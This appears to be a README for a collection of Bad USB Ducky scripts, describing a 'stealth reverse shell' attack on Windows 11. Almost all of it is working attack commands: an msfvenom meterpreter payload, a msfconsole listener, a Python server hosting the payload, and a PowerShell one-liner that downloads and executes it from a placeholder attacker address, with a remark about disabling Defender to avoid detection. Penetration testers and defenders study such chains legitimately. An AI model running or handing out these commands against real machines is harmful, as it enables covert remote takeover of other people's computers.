# Various Ducky scripts for Bad USBs
#### **Can be used for pentesting or administrative tasks.** 
#### **For educational puposes only!**

###Steps to Compromise(StealthReverseShell):
#### **Below text applies to the stealth reverse shell.**


### Requires Admin privileges to disable Defender. Otherwise, the payload may be detected.
### Tested on Windows 11 Home
### Create the payload with msfvenom<br/> 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=AttacksersIP LPORT=AttackersPort -f psh -o PAYLOAD.ps1<br/>
### Open msfconsole and start listener<br/>
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost IP; set lport PORT; set ExitOnSession false; exploit -j"<br/>
### Start python http server<br/>
python3 -m http.server 80<br/>
### Ducky script will download and execute powershell script opening meterpreter session<br/>
IEX(New-Object System.Net.WebClient).DownloadString('http://IPADDR/PAYLOAD.ps1')


